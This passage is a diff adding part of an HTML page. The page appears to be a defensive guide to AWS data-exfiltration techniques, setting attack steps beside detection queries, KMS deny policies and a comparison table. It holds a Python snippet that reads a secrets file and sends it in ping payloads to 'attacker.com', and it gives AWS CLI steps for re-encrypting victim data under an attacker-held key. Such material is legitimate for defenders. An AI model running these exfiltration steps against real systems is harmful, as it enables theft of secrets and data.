+data = open('/tmp/secrets.txt', 'rb').read()
+encoded = base64.b64encode(data)
+
+<span class="code-comment"># Split into 48-byte chunks</span>
+chunk_size = 48
+for i in range(0, len(encoded), chunk_size):
+    chunk = encoded[i:i+chunk_size]
+    
+    <span class="code-comment"># Send via ping with data in payload</span>
+    subprocess.run([
+        'ping', '-c', '1', '-p', chunk.hex(), 'attacker.com'
+    ])
+
+<span class="code-comment"># DETECTION: VPC Flow Logs + CloudWatch Insights</span>
+fields @timestamp, srcaddr, dstaddr, protocol, bytes
+| filter protocol = 1  # ICMP
+| stats count(*) as ping_count, sum(bytes) as total_bytes by srcaddr
+| filter ping_count > 100 or total_bytes > 10000
+
+<span class="code-comment"># PREVENTION: Block ICMP egress in Security Group</span>
+<span class="code-comment"># Only allow ICMP to specific IPs (monitoring tools)</span>
+            </div>
+        </div>
+
+        <!-- TECHNIQUE 12: KMS RE-ENCRYPTION -->
+        <div class="section">
+            <div class="section-title">
+                1️⃣2️⃣ KMS Re-encryption Attack
+                <span class="badge badge-critical">CRITICAL</span>
+            </div>
+            
+            <div class="technique-grid">
+                <div class="technique-box attack">
+                    <div class="box-header">❌ Cross-Account Decrypt</div>
+                    <div class="flow-step danger">
+                        <strong>1. Overprivileged KMS Grant</strong><br/>
+                        Lambda has Decrypt + ReEncrypt permissions<br/>
+                        KMS grant allows external account principal<br/>
+                        No encryption context constraints
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>2. Decrypt Sensitive Data</strong><br/>
+                        Read encrypted S3 objects<br/>
+                        aws kms decrypt --ciphertext-blob ...<br/>
+                        Access plaintext data
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>3. Re-encrypt with Attacker CMK</strong><br/>
+                        aws kms re-encrypt \<br/>
+                        &nbsp;&nbsp;--source-key-id victim-cmk \<br/>
+                        &nbsp;&nbsp;--destination-key-id attacker-cmk<br/>
+                        Data now encrypted with attacker's key<br/>
+                        Store in attacker's S3 bucket
+                    </div>
+                    <div class="flow-step danger">
+                        <strong>4. Exfiltration Complete</strong><br/>
+                        Attacker decrypts with own CMK<br/>
+                        No evidence in victim's CloudTrail<br/>
+                        Decryption happens in attacker account
+                    </div>
+                </div>
+                
+                <div class="technique-box defense">
+                    <div class="box-header">✅ KMS Protection</div>
+                    <div class="flow-step success">
+                        <strong>CMK Key Policy - Restrict Cross-Account</strong><br/>
+                        Deny Decrypt/ReEncrypt to external accounts<br/>
+                        Require aws:SourceAccount condition<br/>
+                        No grants to external principals
+                    </div>
+                    <div class="flow-step success">
+                        <strong>Encryption Context Enforcement</strong><br/>
+                        Require specific encryption context<br/>
+                        Match aws:username or s3:x-amz-server-side-encryption-context<br/>
+                        Cannot decrypt without proper context
+                    </div>
+                    <div class="flow-step success">
+                        <strong>CloudTrail Monitoring</strong><br/>
+                        Alert on Decrypt/ReEncrypt API calls<br/>
+                        Monitor for cross-account ReEncrypt<br/>
+                        Track unusual decrypt volume
+                    </div>
+                </div>
+            </div>
+            
+            <div class="code-block">
+<span class="code-comment"># KMS Key Policy - Prevent cross-account access</span>
+{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Sid": "DenyCrossAccountDecrypt",
+    "Effect": "Deny",
+    "Principal": "*",
+    "Action": ["kms:Decrypt", "kms:ReEncrypt*"],
+    "Resource": "*",
+    "Condition": {
+      "StringNotEquals": {
+        "aws:PrincipalAccount": "123456789012"
+      }
+    }
+  }]
+}
+
+<span class="code-comment"># Encryption Context Requirement</span>
+{
+  "Effect": "Allow",
+  "Action": ["kms:Decrypt"],
+  "Resource": "*",
+  "Condition": {
+    "StringEquals": {
+      "kms:EncryptionContext:department": "finance"
+    }
+  }
+}
+            </div>
+        </div>
+
+        <!-- SUMMARY SECTION -->
+        <div class="alert-banner">
+            <h2 style="font-size: 2rem; margin-bottom: 20px;">🛡️ Defense-in-Depth Strategy</h2>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 25px; margin-top: 30px;">
+                <div style="background: rgba(255,255,255,0.15); padding: 25px; border-radius: 12px;">
+                    <h3 style="font-size: 1.3rem; margin-bottom: 15px;">🔐 Identity & Access</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="margin: 8px 0;">✓ Least privilege IAM policies</li>
+                        <li style="margin: 8px 0;">✓ Service Control Policies (SCPs)</li>
+                        <li style="margin: 8px 0;">✓ Cross-account access restrictions</li>
+                        <li style="margin: 8px 0;">✓ MFA for sensitive operations</li>
+                    </ul>
+                </div>
+                
+                <div style="background: rgba(255,255,255,0.15); padding: 25px; border-radius: 12px;">
+                    <h3 style="font-size: 1.3rem; margin-bottom: 15px;">🌐 Network Security</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="margin: 8px 0;">✓ VPC endpoints for AWS services</li>
+                        <li style="margin: 8px 0;">✓ Network Firewall with stateful rules</li>
+                        <li style="margin: 8px 0;">✓ Security groups: deny unnecessary egress</li>
+                        <li style="margin: 8px 0;">✓ Route 53 Resolver DNS Firewall</li>
+                    </ul>
+                </div>
+                
+                <div style="background: rgba(255,255,255,0.15); padding: 25px; border-radius: 12px;">
+                    <h3 style="font-size: 1.3rem; margin-bottom: 15px;">👁️ Detection & Monitoring</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="margin: 8px 0;">✓ GuardDuty Runtime Monitoring</li>
+                        <li style="margin: 8px 0;">✓ VPC Flow Logs analysis</li>
+                        <li style="margin: 8px 0;">✓ CloudTrail for API activity</li>
+                        <li style="margin: 8px 0;">✓ CloudWatch anomaly detection</li>
+                    </ul>
+                </div>
+                
+                <div style="background: rgba(255,255,255,0.15); padding: 25px; border-radius: 12px;">
+                    <h3 style="font-size: 1.3rem; margin-bottom: 15px;">🔒 Data Protection</h3>
+                    <ul style="list-style: none; padding: 0;">
+                        <li style="margin: 8px 0;">✓ S3 Block Public Access enabled</li>
+                        <li style="margin: 8px 0;">✓ Encryption at rest (KMS)</li>
+                        <li style="margin: 8px 0;">✓ Encryption in transit (TLS 1.3)</li>
+                        <li style="margin: 8px 0;">✓ Data classification & tagging</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- COMPARISON TABLE -->
+        <h2 style="color: #2d3748; margin: 40px 0 20px;">📊 Exfiltration Techniques Comparison</h2>
+        <table class="comparison-table">
+            <thead>
+                <tr>
+                    <th>Technique</th>
+                    <th>Stealth Level</th>
+                    <th>Data Volume</th>
+                    <th>Detection Difficulty</th>
+                    <th>Primary Defense</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>DNS Tunneling</strong></td>
+                    <td>Very High</td>
+                    <td>10GB in 48hrs</td>
+                    <td>Hard</td>
+                    <td>Route 53 DNS Firewall</td>
+                </tr>
+                <tr>
+                    <td><strong>S3 Bucket Sync</strong></td>
+                    <td>Medium</td>
+                    <td>Unlimited (TB)</td>
+                    <td>Easy</td>
+                    <td>SCP + VPC Endpoints</td>
+                </tr>
+                <tr>
+                    <td><strong>HTTP/HTTPS POST</strong></td>
+                    <td>Low</td>
+                    <td>GB per hour</td>
+                    <td>Easy</td>
+                    <td>Network Firewall</td>
+                </tr>
+                <tr>
+                    <td><strong>EBS Snapshot Share</strong></td>
+                    <td>High</td>
+                    <td>Full volume (TB)</td>
+                    <td>Medium</td>
+                    <td>SCP + CloudTrail alerts</td>
+                </tr>
+                <tr>
+                    <td><strong>RDS Snapshot Export</strong></td>
+                    <td>High</td>
+                    <td>Full DB (500GB)</td>
+                    <td>Medium</td>
+                    <td>Deny rds:StartExportTask</td>
+                </tr>
+                <tr>
+                    <td><strong>CloudWatch Logs Stream</strong></td>
+                    <td>Medium</td>
+                    <td>MB per day</td>
+                    <td>Hard</td>
+                    <td>Cross-account restrictions</td>
+                </tr>
+                <tr>
+                    <td><strong>Lambda Layer</strong></td>
+                    <td>High</td>
+                    <td>250MB per layer</td>
+                    <td>Very Hard</td>
+                    <td>Layer permission monitoring</td>
+                </tr>
+                <tr>
+                    <td><strong>ECR Image Push</strong></td>
+                    <td>Very High</td>
+                    <td>GB per image</td>
+                    <td>Very Hard</td>
+                    <td>ECR policy + image scanning</td>
+                </tr>
+                <tr>
+                    <td><strong>SQS/SNS Messages</strong></td>
+                    <td>Medium</td>
+                    <td>256KB per msg</td>
+                    <td>Medium</td>
+                    <td>Resource-based policies</td>
+                </tr>
+                <tr>
+                    <td><strong>SSH Tunnel</strong></td>
+                    <td>Low</td>
+                    <td>GB per hour</td>
+                    <td>Easy</td>
+                    <td>Block outbound SSH</td>
+                </tr>
+                <tr>
+                    <td><strong>ICMP Tunneling</strong></td>
+                    <td>Very High</td>
+                    <td>MB per hour</td>
+                    <td>Very Hard</td>
+                    <td>Block ICMP egress</td>
+                </tr>
+                <tr>
+                    <td><strong>KMS Re-encryption</strong></td>
+                    <td>Very High</td>
+                    <td>Unlimited</td>
+                    <td>Hard</td>
+                    <td>CMK key policy restrictions</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <div style="text-align: center; margin-top: 60px; padding: 40px; background: #f7fafc; border-radius: 12px;">
+            <h2 style="color: #2d3748; margin-bottom: 20px;">💰 Cost of Prevention vs. Breach</h2>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 40px; max-width: 900px; margin: 30px auto;">
+                <div>
+                    <div style="font-size: 3rem; font-weight: bold; color: #2f855a;">$3K</div>
+                    <div style="color: #4a5568; font-size: 1.1rem; margin-top: 10px;">
+                        <strong>Monthly Prevention Cost</strong><br/>
+                        GuardDuty + Network Firewall + DNS Firewall + CloudTrail
+                    </div>
+                </div>
+                <div>
+                    <div style="font-size: 3rem; font-weight: bold; color: #c53030;">$4.5M</div>
+                    <div style="color: #4a5568; font-size: 1.1rem; margin-top: 10px;">
+                        <strong>Average Data Breach Cost</strong><br/>
+                        Including remediation, fines, and customer churn
+                    </div>
+                </div>
+            </div>
+            <p style="margin-top: 30px; color: #2d3748; font-size: 1.2rem;">
+                <strong>ROI: Prevent $4.5M breach for $36K/year = 125x return on investment</strong>
+            </p>
+        </div>
+    </div>
+</body>
+</html>
